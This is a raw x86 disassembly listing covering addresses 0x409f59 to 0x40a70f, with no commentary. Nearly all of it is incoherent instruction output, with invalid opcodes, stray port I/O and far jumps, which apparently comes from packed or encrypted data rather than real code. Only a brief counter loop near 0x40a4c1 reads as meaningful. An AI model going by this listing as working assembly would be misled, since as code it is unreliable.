  409f59:	ins    DWORD PTR es:[edi],dx
  409f5a:	inc    ebp
  409f5b:	xor    BYTE PTR [ebx+0x7834a571],bl
  409f61:	push   ecx
  409f62:	mov    eax,ds:0x3903971c
  409f67:	jbe    0x409f7c
  409f69:	aas    
  409f6a:	xor    BYTE PTR [esp+ebp*8-0x49],cl
  409f6e:	jmp    0x409f4c
  409f70:	add    eax,0x9359952
  409f75:	cmp    al,BYTE PTR [edx-0x69097f5b]
  409f7b:	icebp  
  409f7c:	mov    ecx,0x30e5644d
  409f81:	out    0xee,al
  409f83:	sub    DWORD PTR [edi-0x37],esi
  409f86:	mov    esp,0x9a53cb1c
  409f8b:	adc    eax,0x895a2859
  409f90:	push   esp
  409f91:	rol    ebp,1
  409f93:	aad    0x44
  409f95:	mov    dl,0xd9
  409f97:	iret   
  409f98:	addr16 inc eax
  409f9a:	stc    
  409f9b:	ret    
  409f9c:	mov    BYTE PTR [ecx],cl
  409f9e:	out    dx,eax
  409f9f:	sbb    DWORD PTR [ebx],edx
  409fa1:	push   0xffffffc5
  409fa3:	inc    ebp
  409fa4:	or     DWORD PTR ds:0x2c482cf8,ecx
  409faa:	scas   eax,DWORD PTR es:[edi]
  409fab:	push   esp
  409fac:	adc    al,ch
  409fae:	pop    edx
  409faf:	dec    ecx
  409fb0:	or     cl,dh
  409fb2:	sub    ecx,DWORD PTR [ebp-0x33]
  409fb5:	pop    eax
  409fb6:	push   esi
  409fb7:	loope  0x40a015
  409fb9:	test   DWORD PTR [ecx+0x7d],0xef974db8
  409fc0:	sbb    eax,0x4ae69edc
  409fc5:	lods   al,BYTE PTR ds:[esi]
  409fc6:	and    DWORD PTR [edx+0xb],0x64
  409fca:	clc    
  409fcb:	call   0x686e:0x43557b9f
  409fd2:	adc    ah,bl
  409fd4:	dec    edx
  409fd5:	push   ss
  409fd6:	and    DWORD PTR [ebx+0x2b70c26f],esp
  409fdc:	out    dx,al
  409fdd:	adc    eax,0xed12d1af
  409fe2:	add    eax,0xab875c79
  409fe7:	adc    BYTE PTR [edi+ebp*8-0x1391da1],ah
  409fee:	fild   WORD PTR [eax]
  409ff0:	cmp    dl,BYTE PTR [edi-0xb]
  409ff3:	xchg   esi,ecx
  409ff5:	lahf   
  409ff6:	dec    edx
  409ff7:	xor    DWORD PTR [eax],ebx
  409ff9:	push   bp
  409ffb:	inc    ecx
  409ffc:	popa   
  409ffd:	sbb    dh,BYTE PTR [eax]
  409fff:	mov    ecx,0xeb46cc17
  40a004:	pop    ebx
  40a005:	cwde   
  40a006:	out    0xd8,al
  40a008:	or     DWORD PTR [ecx+0x75],edi
  40a00b:	cld    
  40a00c:	mov    bh,bh
  40a00e:	out    0x6,eax
  40a010:	lahf   
  40a011:	jo     0x40a007
  40a013:	jecxz  0x40a04e
  40a015:	and    al,0x3c
  40a017:	popa   
  40a018:	std    
  40a019:	shl    ebx,0x1f
  40a01c:	and    DWORD PTR [eax-0x54],esp
  40a01f:	outs   dx,DWORD PTR ds:[esi]
  40a020:	iret   
  40a021:	loope  0x40a081
  40a023:	mov    cl,0xd3
  40a025:	and    BYTE PTR ds:0x2b9bf2b6,ch
  40a02b:	mov    ds:0xbcdc5d29,eax
  40a030:	out    0x79,al
  40a032:	in     eax,dx
  40a033:	mov    al,BYTE PTR [edx-0x5]
  40a036:	pop    eax
  40a037:	sbb    al,0x69
  40a039:	mov    ebp,edx
  40a03b:	xor    eax,0x7ae94b47
  40a040:	into   
  40a041:	mov    cl,0xfb
  40a043:	retf   0xc40e
  40a046:	xchg   ebp,eax
  40a047:	adc    eax,DWORD PTR [edx-0x63]
  40a04a:	pop    esp
  40a04b:	fisttp QWORD PTR [ebx-0x747b188c]
  40a051:	jb     0x40a01c
  40a053:	push   esp
  40a054:	cmp    al,0x53
  40a056:	aaa    
  40a057:	stos   BYTE PTR es:[edi],al
  40a058:	jo     0x409fe6
  40a05a:	xchg   edx,eax
  40a05b:	cmp    cl,BYTE PTR [edi+0x422f7475]
  40a061:	ret    0xf304
  40a064:	cli    
  40a065:	int    0xce
  40a067:	inc    esp
  40a068:	push   ecx
  40a069:	icebp  
  40a06a:	sbb    DWORD PTR [esi-0x65],eax
  40a06d:	inc    edx
  40a06e:	bound  esp,QWORD PTR [esi-0x3b960d07]
  40a074:	xchg   DWORD PTR ds:0x3365754b,eax
  40a07a:	push   eax
  40a07b:	cmc    
  40a07c:	(bad)  
  40a07d:	xchg   esp,eax
  40a07e:	xchg   esi,eax
  40a07f:	xchg   edx,eax
  40a080:	xchg   esp,eax
  40a081:	int    0xfd
  40a083:	mov    al,0x46
  40a085:	lods   eax,DWORD PTR ds:[esi]
  40a086:	mov    ds:0x735d3bbf,al
  40a08b:	popf   
  40a08c:	js     0x40a08e
  40a08e:	mov    cl,0xef
  40a090:	shl    BYTE PTR [ebx+0x39],cl
  40a093:	shl    DWORD PTR [ecx+0x3fe15198],1
  40a099:	sbb    DWORD PTR [edi+0x6e],0xffffff99
  40a09d:	inc    eax
  40a09e:	xor    dh,BYTE PTR [eax]
  40a0a0:	push   es
  40a0a1:	std    
  40a0a2:	xchg   esi,eax
  40a0a3:	popa   
  40a0a4:	gs ins DWORD PTR es:[edi],dx
  40a0a6:	inc    eax
  40a0a7:	sub    ebx,DWORD PTR [esi+0x5ba40f4]
  40a0ad:	push   0x2a
  40a0af:	sbb    bh,cl
  40a0b1:	(bad)  
  40a0b2:	xor    eax,0x2c3077d7
  40a0b7:	xchg   ecx,eax
  40a0b8:	adc    BYTE PTR gs:[ecx-0x39bfe665],0x46
  40a0c0:	aaa    
  40a0c1:	mov    DWORD PTR [edi],ebx
  40a0c3:	adc    BYTE PTR [ebx],dl
  40a0c5:	dec    DWORD PTR [ebp+0x39e933ed]
  40a0cb:	or     eax,0x31fc81e8
  40a0d0:	jmp    0xc9b37c0a
  40a0d5:	into   
  40a0d6:	stc    
  40a0d7:	stc    
  40a0d8:	xchg   ebp,eax
  40a0d9:	inc    esp
  40a0da:	or     al,0x95
  40a0dc:	fcomp  QWORD PTR [esi+edi*1+0x7995a77c]
  40a0e3:	mov    dh,0xeb
  40a0e5:	push   cs
  40a0e6:	dec    edi
  40a0e7:	loopne 0x40a0e0
  40a0e9:	mov    dl,0x7f
  40a0eb:	cmp    ecx,DWORD PTR [ebx+0x56]
  40a0ee:	mov    BYTE PTR [edi],ch
  40a0f0:	das    
  40a0f1:	test   BYTE PTR [esi+0x0],ah
  40a0f4:	loopne 0x40a0df
  40a0f6:	pop    ss
  40a0f7:	sub    al,0x2f
  40a0f9:	nop
  40a0fa:	retf   
  40a0fb:	xor    eax,0xd47cf99
  40a100:	dec    ebx
  40a101:	(bad)  
  40a102:	cmp    eax,0xc52a6d33
  40a107:	mov    ah,0x4c
  40a109:	mov    BYTE PTR [edx+0x53fdba32],cl
  40a10f:	(bad)
  40a112:	xlat   BYTE PTR ds:[ebx]
  40a113:	and    ch,BYTE PTR [ebp-0x46]
  40a116:	popa   
  40a117:	push   0x91ba49f1
  40a11c:	sbb    eax,0xffee0396
  40a121:	xchg   esp,eax
  40a122:	clc    
  40a123:	pop    ebx
  40a124:	push   edi
  40a125:	or     esi,DWORD PTR [edi-0x27ef1391]
  40a12b:	lods   al,BYTE PTR ds:[esi]
  40a12c:	sub    bl,cl
  40a12e:	or     al,0x37
  40a130:	mov    ds:0xc2784694,eax
  40a135:	pop    edx
  40a136:	fs cdq 
  40a138:	mov    ds:0x23809f61,al
  40a13d:	clc    
  40a13e:	sbb    bh,ah
  40a140:	and    eax,0x868a05b2
  40a145:	pop    ebx
  40a146:	inc    esp
  40a147:	xchg   edi,eax
  40a148:	sbb    BYTE PTR [eax+0x315b0647],cl
  40a14e:	adc    DWORD PTR [ecx],eax
  40a150:	in     eax,0x69
  40a152:	jne    0x40a177
  40a154:	inc    esi
  40a155:	out    dx,eax
  40a156:	push   eax
  40a157:	sbb    eax,0x9c9052e6
  40a15c:	and    ah,ch
  40a15e:	icebp  
  40a15f:	jno    0x40a1c8
  40a161:	jae    0x40a106
  40a163:	int    0x4
  40a165:	push   ss
  40a166:	xor    eax,esi
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	(bad)  
  40a17b:	inc    edi
  40a17c:	sbb    DWORD PTR [ecx],edi
  40a17e:	out    0x7e,eax
  40a180:	jle    0x40a1b0
  40a182:	jge    0x40a202
  40a184:	jle    0x40a19a
  40a186:	ins    BYTE PTR es:[edi],dx
  40a187:	rol    BYTE PTR [ebx-0x19],cl
  40a18a:	pop    ebx
  40a18b:	ds dec edx
  40a18d:	inc    esi
  40a18e:	test   BYTE PTR [edi+edi*4-0x2f],dl
  40a192:	cs jnp 0x40a184
  40a195:	inc    ebx
  40a196:	in     eax,dx
  40a197:	push   ss
  40a198:	retf   0x457a
  40a19b:	jae    0x40a1f3
  40a19d:	jmp    0xb467265c
  40a1a2:	jge    0x40a1c5
  40a1a4:	dec    esp
  40a1a5:	outs   dx,BYTE PTR ds:[esi]
  40a1a6:	loopne 0x40a14d
  40a1a8:	mov    ds:0x1e74070b,al
  40a1ad:	jmp    0x8670:0x33b0086c
  40a1b4:	pushf  
  40a1b5:	or     al,0x6f
  40a1b7:	aaa    
  40a1b8:	js     0x40a170
  40a1ba:	movups XMMWORD PTR [ecx+0x38bd4638],xmm4
  40a1c1:	les    ecx,FWORD PTR fs:0x4e20d2f9
  40a1c8:	mov    ds:0x14766195,eax
  40a1cd:	cdq    
  40a1ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1cf:	cmp    DWORD PTR [ebx-0x34],ecx
  40a1d2:	pop    es
  40a1d3:	xchg   ecx,eax
  40a1d4:	cmc    
  40a1d5:	loop   0x40a188
  40a1d7:	xchg   ebp,eax
  40a1d8:	mov    eax,ds:0x1a1aa395
  40a1dd:	arpl   WORD PTR [ebx+0x4240eb77],bp
  40a1e3:	addr16 das 
  40a1e5:	sub    al,0xff
  40a1e7:	push   esi
  40a1e8:	enter  0x78c,0x61
  40a1ec:	dec    esi
  40a1ed:	xchg   ecx,eax
  40a1ee:	xor    BYTE PTR [ebx-0x21c980f3],ah
  40a1f4:	lods   eax,DWORD PTR ds:[esi]
  40a1f5:	mov    edi,0xfe50da4b
  40a1fa:	in     eax,dx
  40a1fb:	mov    al,0x80
  40a1fd:	mov    eax,0xbe1343ad
  40a202:	jl     0x40a1c4
  40a204:	xchg   edx,eax
  40a205:	in     al,dx
  40a206:	inc    edx
  40a207:	and    BYTE PTR [esi+0x7a],0xda
  40a20b:	test   eax,0xbe46417f
  40a210:	push   ebp
  40a211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a212:	imul   ecx,DWORD PTR [eax-0x52],0xffffff97
  40a216:	jl     0x40a1ea
  40a218:	mov    dh,0x72
  40a21a:	aam    0x5d
  40a21c:	dec    eax
  40a21d:	xchg   edx,eax
  40a21e:	add    DWORD PTR [ecx],esp
  40a220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a221:	and    cl,BYTE PTR [edx]
  40a223:	adc    BYTE PTR [edx-0x16],ch
  40a226:	push   0x140924e1
  40a22b:	aam    0x4a
  40a22d:	fsubr  DWORD PTR [eax-0x6637188]
  40a233:	pushf  
  40a234:	cli    
  40a235:	out    dx,eax
  40a236:	rcr    DWORD PTR ss:[esi+0x51],0xe4
  40a23b:	add    BYTE PTR [esi+0x2642e4fd],0x7b
  40a242:	dec    ecx
  40a243:	cmp    al,0x22
  40a245:	sub    edi,DWORD PTR [ebp+ecx*8-0x38aaf416]
  40a24c:	xchg   edx,eax
  40a24d:	in     al,0xf
  40a24f:	xor    eax,0x193cd619
  40a254:	clc    
  40a255:	aam    0x54
  40a257:	popa   
  40a258:	dec    ecx
  40a259:	fistp  QWORD PTR [eax]
  40a25b:	sar    DWORD PTR [ebp+0x68a33d2c],0x9e
  40a262:	cs cmp eax,0xf10d13b6
  40a268:	mov    eax,ds:0xb754cdb6
  40a26d:	and    al,0xce
  40a26f:	and    DWORD PTR [eax+0x4e],0xe382da9d
  40a276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a277:	popa   
  40a278:	(bad)  
  40a279:	jge    0x40a26d
  40a27b:	call   0xdb8ca0c3
  40a280:	and    DWORD PTR [ecx-0x71],0xc783693c
  40a287:	dec    edx
  40a288:	jge    0x40a214
  40a28a:	push   esi
  40a28b:	pop    esi
  40a28c:	es push esp
  40a28e:	sbb    eax,0xe2d2f854
  40a293:	lods   eax,DWORD PTR ds:[esi]
  40a294:	mov    DWORD PTR [esi+0x54],ebx
  40a297:	and    BYTE PTR [eax],al
  40a299:	lods   al,BYTE PTR ds:[esi]
  40a29a:	and    eax,0xed5521e9
  40a29f:	aad    0x30
  40a2a1:	push   edi
  40a2a2:	mov    bl,0xd9
  40a2a4:	mov    edi,0x591cbd5a
  40a2a9:	sub    eax,0x86ed1ee7
  40a2ae:	dec    esi
  40a2af:	(bad)  ds:0xda2630eb
  40a2b5:	adc    DWORD PTR [esi-0x6dc10b38],eax
  40a2bb:	cdq    
  40a2bc:	iretw  
  40a2be:	push   eax
  40a2bf:	icebp  
  40a2c0:	jo     0x40a27c
  40a2c2:	cdq    
  40a2c3:	mov    esp,0x6096693c
  40a2c8:	sbb    al,0x4c
  40a2ca:	jmp    0x779daef3
  40a2cf:	xor    BYTE PTR [ebp-0x365fd302],dh
  40a2d5:	(bad)  
  40a2d6:	xlat   BYTE PTR ds:[ebx]
  40a2d7:	call   0x49e9:0xe7a74b30
  40a2de:	dec    ecx
  40a2df:	push   0x22
  40a2e1:	call   0x747923e9
  40a2e6:	cmp    eax,0x3630b2bc
  40a2eb:	cmp    DWORD PTR [ecx-0x7e86c74e],ecx
  40a2f1:	aas    
  40a2f2:	mov    cs,edx
  40a2f4:	mov    al,ds:0x688c3db0
  40a2f9:	pop    ebp
  40a2fa:	inc    eax
  40a2fb:	repz ror edx,1
  40a2fe:	dec    esp
  40a2ff:	sub    dh,cl
  40a301:	xchg   ebp,eax
  40a302:	ins    BYTE PTR es:[edi],dx
  40a303:	addr16 fcomi st,st(7)
  40a306:	push   edx
  40a307:	sub    ebp,DWORD PTR [ecx]
  40a309:	jmp    0xd68fc4bf
  40a30e:	lea    eax,[edi+0x32b0b5ac]
  40a314:	loope  0x40a2f2
  40a316:	xor    bl,BYTE PTR cs:[ecx-0x60b3f153]
  40a31d:	retf   0x3006
  40a320:	mov    BYTE PTR [ebx+0x4],dh
  40a323:	in     al,0x89
  40a325:	xchg   ebx,eax
  40a326:	cwde   
  40a327:	iret   
  40a328:	add    eax,0x4ba90e7e
  40a32d:	xor    ebx,DWORD PTR [eax+edi*2+0x528af7]
  40a334:	mul    DWORD PTR [esi]
  40a336:	retf   
  40a337:	ss ja  0x40a2bf
  40a33a:	mov    ah,0xd9
  40a33c:	xchg   ecx,eax
  40a33d:	shl    esi,cl
  40a33f:	mov    dh,BYTE PTR [esi+eiz*4-0x66]
  40a343:	mov    ebp,0x3390eb6
  40a348:	or     DWORD PTR [esi],eax
  40a34a:	test   al,0xea
  40a34c:	sub    eax,0x1ea9e5c2
  40a351:	inc    eax
  40a352:	pushf  
  40a353:	mov    eax,0x7539843f
  40a358:	in     al,0x12
  40a35a:	mov    bh,ah
  40a35c:	out    dx,eax
  40a35d:	sub    edx,DWORD PTR [edi]
  40a35f:	mov    ecx,0xb728b006
  40a364:	jbe    0x40a382
  40a366:	mov    al,ds:0x1421fc3b
  40a36b:	xchg   ebp,eax
  40a36c:	shl    DWORD PTR [edx+eiz*1],1
  40a36f:	repnz inc ebx
  40a371:	push   edi
  40a372:	or     al,0xd6
  40a374:	sub    dh,dl
  40a376:	mov    eax,ds:0x5f84e3ac
  40a37b:	repnz in eax,dx
  40a37d:	(bad)  
  40a37e:	dec    esi
  40a37f:	psubd  mm5,QWORD PTR [esi+0x6522fd14]
  40a386:	sti    
  40a387:	jg     0x40a34c
  40a389:	ja     0x40a3ae
  40a38b:	dec    eax
  40a38c:	mov    ebx,0xf5f5edca
  40a391:	mov    eax,0xf063c485
  40a396:	or     BYTE PTR [edx+edx*1+0x38],bl
  40a39a:	inc    edi
  40a39b:	fild   DWORD PTR [esi-0x47]
  40a39e:	inc    ebp
  40a39f:	lds    ebx,FWORD PTR [edi+0x3d3153b5]
  40a3a5:	sahf   
  40a3a6:	mov    WORD PTR [ecx+0x497929d5],ds
  40a3ac:	shr    ebx,cl
  40a3ae:	jae    0x40a3b7
  40a3b0:	mov    ecx,0x83d29e5d
  40a3b5:	push   edi
  40a3b6:	inc    eax
  40a3b7:	add    eax,0xfd4eb9bd
  40a3bc:	xor    DWORD PTR [edx+0x64882206],ebp
  40a3c2:	lods   al,BYTE PTR ds:[esi]
  40a3c3:	pop    esp
  40a3c4:	shr    BYTE PTR [edi-0x198a0c9a],cl
  40a3ca:	psadbw mm3,mm0
  40a3cd:	fsub   QWORD PTR [ecx+0x7f]
  40a3d0:	cmp    eax,0xef464069
  40a3d5:	jp     0x40a38a
  40a3d7:	(bad)  
  40a3d8:	xchg   ecx,eax
  40a3d9:	cs push cs
  40a3db:	pop    ds
  40a3dc:	jle    0x40a453
  40a3de:	inc    edx
  40a3df:	xor    BYTE PTR [esi-0x25],bh
  40a3e2:	repz adc WORD PTR [edi+0x4c],0x3dd0
  40a3e9:	clc    
  40a3ea:	sub    ah,BYTE PTR [esi]
  40a3ec:	add    bh,ah
  40a3ee:	repz enter 0xcc09,0x48
  40a3f3:	sub    eax,0xc1d1f7d2
  40a3f8:	lock jne 0x40a47a
  40a3fb:	cmp    ch,BYTE PTR [edi+0x7e]
  40a3fe:	jecxz  0x40a3b7
  40a400:	xchg   edx,eax
  40a401:	pop    ds
  40a402:	sub    dh,0x7d
  40a405:	fs xchg ebp,eax
  40a407:	gs jo  0x40a3a2
  40a40a:	hlt    
  40a40b:	mov    DWORD PTR [eax+0x2235b3fc],ecx
  40a411:	sti    
  40a412:	sub    ebx,edi
  40a414:	test   BYTE PTR [esi-0x5f],bl
  40a417:	cmp    ebx,DWORD PTR [eax+ebx*4-0x44]
  40a41b:	gs and eax,0xcdbc16d6
  40a421:	loopne 0x40a3dd
  40a423:	mov    ebp,0x80558797
  40a428:	ins    DWORD PTR es:[edi],dx
  40a429:	(bad)  
  40a42a:	aaa    
  40a42b:	dec    esi
  40a42c:	daa    
  40a42d:	pop    es
  40a42e:	cmp    ebp,0x2d93cf47
  40a434:	ficomp DWORD PTR [eax+ecx*1]
  40a437:	sti    
  40a438:	xor    eax,0x1f9a801c
  40a43d:	addr16 xchg ebp,eax
  40a43f:	xchg   ebx,eax
  40a440:	mov    dh,0x98
  40a442:	iret   
  40a443:	call   FWORD PTR [ecx-0x27]
  40a446:	dec    ebp
  40a447:	push   ss
  40a448:	lds    eax,FWORD PTR [edi-0x19f5bcd7]
  40a44e:	jl     0x40a414
  40a450:	sub    edi,DWORD PTR [bx-0x4a1d]
  40a455:	and    edx,edx
  40a457:	push   ecx
  40a458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a459:	dec    ecx
  40a45a:	mov    bl,0xc3
  40a45c:	add    cl,BYTE PTR [ecx]
  40a45e:	aaa    
  40a45f:	fild   DWORD PTR [ecx-0x6e707fc1]
  40a465:	pusha  
  40a466:	jo     0x40a402
  40a468:	test   eax,0xe79e9ac8
  40a46d:	call   0xe7c7:0xd5cc8f27
  40a474:	jle    0x40a48c
  40a476:	adc    eax,0x58dcba1f
  40a47b:	adc    al,0x19
  40a47d:	scas   al,BYTE PTR es:[edi]
  40a47e:	or     dh,BYTE PTR [eax+0x49]
  40a481:	in     al,0x41
  40a483:	cmp    eax,0x705034e4
  40a488:	add    edi,eax
  40a48a:	sar    ecx,0x23
  40a48d:	xor    BYTE PTR [ebx+0x24],bl
  40a490:	cdq    
  40a491:	pushf  
  40a492:	pop    edx
  40a493:	inc    edx
  40a494:	test   ecx,edx
  40a496:	pop    ds
  40a497:	out    0x9a,al
  40a499:	xchg   esp,eax
  40a49a:	addr16 fwait
  40a49c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40a49e:	jne    0x40a4f6
  40a4a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4a1:	sbb    al,0x6a
  40a4a3:	fwait
  40a4a4:	and    BYTE PTR [edx],ch
  40a4a6:	clc    
  40a4a7:	ss dec ebp
  40a4a9:	scas   al,BYTE PTR es:[edi]
  40a4aa:	sti    
  40a4ab:	mov    esp,0x9e0c602f
  40a4b0:	or     cl,BYTE PTR [edi+0x3cc464d]
  40a4b6:	mov    DWORD PTR [ecx+0x4302f125],0x0
  40a4c0:	add    BYTE PTR [ebx],dh
  40a4c2:	fisttp DWORD PTR [ebx]
  40a4c4:	sbb    eax,0x4302f1
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x4302f1,ebx
  40a4d0:	cmp    DWORD PTR ds:0x4302f1,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42eabb
  40a4e8:	cmp    DWORD PTR ds:0x4302f1,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	ss stos BYTE PTR es:[edi],al
  40a512:	mov    esi,0xe2e9b718
  40a517:	jle    0x40a597
  40a519:	cs jge 0x40a59a
  40a51c:	jle    0x40a508
  40a51e:	inc    ebx
  40a51f:	(bad)  
  40a520:	in     eax,0xca
  40a522:	arpl   WORD PTR [eax+0x75],cx
  40a525:	retf   
  40a526:	xor    eax,0x6215ae3f
  40a52b:	xchg   DWORD PTR [eax-0x5],edi
  40a52e:	pop    ss
  40a52f:	xchg   BYTE PTR [eax+eiz*1+0xc],ch
  40a533:	jge    0x40a53a
  40a535:	mov    eax,ds:0x188f1264
  40a53a:	xor    eax,0x6c2c95d3
  40a53f:	sub    DWORD PTR [edx+0x6d2e3130],ebp
  40a545:	cmp    DWORD PTR [eax+0x52],edx
  40a548:	lea    esp,[esi]
  40a54a:	(bad)  
  40a54b:	fcmovbe st,st(7)
  40a54d:	push   esp
  40a54e:	mov    DWORD PTR [edx-0x7b],esp
  40a551:	pop    ebp
  40a552:	and    ecx,DWORD PTR [ebx]
  40a554:	inc    esi
  40a555:	sbb    esp,ebx
  40a557:	test   BYTE PTR [ecx+0x42],al
  40a55a:	cdq    
  40a55b:	ret    
  40a55c:	adc    eax,0xb8fcb47b
  40a561:	scas   al,BYTE PTR es:[edi]
  40a562:	jnp    0x40a51c
  40a564:	shl    DWORD PTR [esi],0x3c
  40a567:	fcmovne st,st(0)
  40a569:	jnp    0x40a5ad
  40a56b:	jbe    0x40a5b2
  40a56d:	pop    esp
  40a56e:	adc    al,0x6a
  40a570:	and    DWORD PTR [edi-0x4b],ebx
  40a573:	cmp    esi,DWORD PTR [ecx]
  40a575:	mov    esi,0xa62bcf5e
  40a57a:	arpl   WORD PTR [ebx-0x66fba49],bx
  40a580:	fld    QWORD PTR [eax+0x6fe90f62]
  40a586:	xchg   edi,eax
  40a587:	sbb    DWORD PTR [edi+0x3e],0x37772247
  40a58e:	push   ds
  40a58f:	ja     0x40a522
  40a591:	and    ebp,DWORD PTR [ecx+0x798a2524]
  40a597:	lods   al,BYTE PTR ds:[esi]
  40a598:	in     al,dx
  40a599:	popa   
  40a59a:	in     eax,dx
  40a59b:	mov    bh,0x34
  40a59d:	fst    DWORD PTR [esi+eiz*8+0x720b4c2]
  40a5a4:	aad    0x8e
  40a5a6:	dec    eax
  40a5a7:	sub    ch,BYTE PTR [eax+0x79a0dc65]
  40a5ad:	and    eax,0x500f0932
  40a5b2:	loop   0x40a5ca
  40a5b4:	lea    ebx,[edx]
  40a5b6:	dec    edi
  40a5b7:	adc    al,0x3d
  40a5b9:	push   cs
  40a5ba:	jl     0x40a554
  40a5bc:	push   0x2b1680ac
  40a5c1:	jge    0x40a567
  40a5c3:	lods   eax,DWORD PTR ds:[esi]
  40a5c4:	jo     0x40a549
  40a5c6:	scas   al,BYTE PTR es:[edi]
  40a5c7:	push   esi
  40a5c8:	push   DWORD PTR [ecx-0x4c]
  40a5cb:	out    dx,al
  40a5cc:	sbb    eax,0x731b05f1
  40a5d1:	out    dx,al
  40a5d2:	inc    eax
  40a5d3:	jecxz  0x40a62e
  40a5d5:	in     al,dx
  40a5d6:	add    BYTE PTR [esi-0x15],0xf8
  40a5da:	mov    edi,0x8f3594ff
  40a5df:	mov    eax,0xa4695aaf
  40a5e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e5:	mov    esp,DWORD PTR [eax+0x38a83b79]
  40a5eb:	ret    0x1f81
  40a5ee:	retf   0x833a
  40a5f1:	cmp    BYTE PTR [edx],cl
  40a5f3:	lea    esp,[ecx+0x770f3768]
  40a5f9:	mov    dh,0x46
  40a5fb:	jbe    0x40a5a8
  40a5fd:	or     BYTE PTR [eax],ch
  40a5ff:	mov    esi,0x90846de7
  40a604:	imul   BYTE PTR [ebp+0x56e1ab76]
  40a60a:	adc    DWORD PTR [eax+0x75f34f55],eax
  40a610:	xor    bl,BYTE PTR [ecx]
  40a612:	mov    ecx,0x2f4e6051
  40a617:	jle    0x40a686
  40a619:	push   es
  40a61a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a61b:	mov    edi,0xecda682
  40a620:	test   al,0xfd
  40a622:	shl    DWORD PTR [eax],0x9e
  40a625:	call   0xab086f95
  40a62a:	std    
  40a62b:	mov    ebp,0x76e20a2a
  40a630:	pop    esi
  40a631:	(bad)  [edx+0x975ec6c]
  40a637:	add    DWORD PTR ds:0x5a8d18a,0xffffffb2
  40a63e:	inc    ebp
  40a63f:	es pop esi
  40a641:	push   0xffffff83
  40a643:	stos   BYTE PTR es:[edi],al
  40a644:	leave  
  40a645:	mov    edi,0x83ca1b77
  40a64a:	aas    
  40a64b:	fwait
  40a64c:	call   FWORD PTR [edi]
  40a64e:	mov    cs,WORD PTR [ebx-0x200deaee]
  40a654:	pop    ecx
  40a655:	test   al,0xa
  40a657:	push   ebp
  40a658:	push   ecx
  40a659:	pop    ss
  40a65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a65b:	(bad)  
  40a65c:	int    0x3a
  40a65e:	sub    al,0x52
  40a660:	xor    DWORD PTR [esi],esi
  40a662:	jl     0x40a6c5
  40a664:	xor    edx,eax
  40a666:	mov    ebp,0xd995058f
  40a66b:	test   eax,0xa405184f
  40a670:	cmp    edi,ecx
  40a672:	xchg   ebx,eax
  40a673:	call   0x12ad:0xd3a4f3e8
  40a67a:	xor    esi,DWORD PTR gs:[eax+0x67f8de3]
  40a681:	out    dx,eax
  40a682:	push   0x3698e237
  40a687:	xchg   esp,eax
  40a688:	mov    BYTE PTR [ebp-0x2a],ah
  40a68b:	stos   BYTE PTR es:[edi],al
  40a68c:	jb     0x40a621
  40a68e:	sub    esi,DWORD PTR [eax-0x3c45c86c]
  40a694:	pusha  
  40a695:	sub    DWORD PTR [edi],0x28
  40a698:	dec    esp
  40a699:	ja     0x40a6b0
  40a69b:	leave  
  40a69c:	cld    
  40a69d:	aaa    
  40a69e:	or     DWORD PTR [ebx],ebx
  40a6a0:	jmp    0x40a6db
  40a6a2:	int3   
  40a6a3:	test   al,0xaa
  40a6a5:	pop    ss
  40a6a6:	jmp    0x3b0c:0x14e55179
  40a6ad:	mov    dl,0x81
  40a6af:	push   ds
  40a6b0:	dec    eax
  40a6b1:	xchg   esp,eax
  40a6b2:	out    0x59,al
  40a6b4:	push   ds
  40a6b5:	push   ecx
  40a6b6:	cwde   
  40a6b7:	xor    eax,0x1d3e659a
  40a6bc:	popf   
  40a6bd:	dec    ebp
  40a6be:	call   0xa081:0xb05f2c81
  40a6c5:	sub    ah,BYTE PTR [ebp-0x3b]
  40a6c8:	fwait
  40a6c9:	in     al,0xa5
  40a6cb:	aaa    
  40a6cc:	cwde   
  40a6cd:	mov    DWORD PTR [ebx-0x47],esi
  40a6d0:	push   eax
  40a6d1:	push   eax
  40a6d2:	aas    
  40a6d3:	int    0x25
  40a6d5:	xchg   esp,eax
  40a6d6:	cmp    BYTE PTR [ebp-0x35],0x23
  40a6da:	nop
  40a6db:	inc    edx
  40a6dc:	push   0xffffff9b
  40a6de:	ins    DWORD PTR es:[edi],dx
  40a6df:	cmp    cl,BYTE PTR [ecx+ebx*1]
  40a6e2:	das    
  40a6e3:	add    DWORD PTR [esi+0x4c94c428],0x6e50249
  40a6ed:	fcomi  st,st(2)
  40a6ef:	aaa    
  40a6f0:	jns    0x40a676
  40a6f2:	or     DWORD PTR [eax],ecx
  40a6f4:	arpl   WORD PTR [esi],bx
  40a6f6:	ins    BYTE PTR es:[edi],dx
  40a6f7:	xor    ebx,esi
  40a6f9:	mov    ch,0xa6
  40a6fb:	pusha  
  40a6fc:	vcmppd ymm0,ymm3,YMMWORD PTR [edx],0x93
  40a702:	out    0xe2,eax
  40a704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a705:	fild   QWORD PTR [eax+0x49]
  40a708:	cmp    al,0xa7
  40a70a:	stc    
  40a70b:	stc    
  40a70c:	ds sub al,0x71
  40a70f:	add    BYTE PTR [eax+0x33a4804],bh
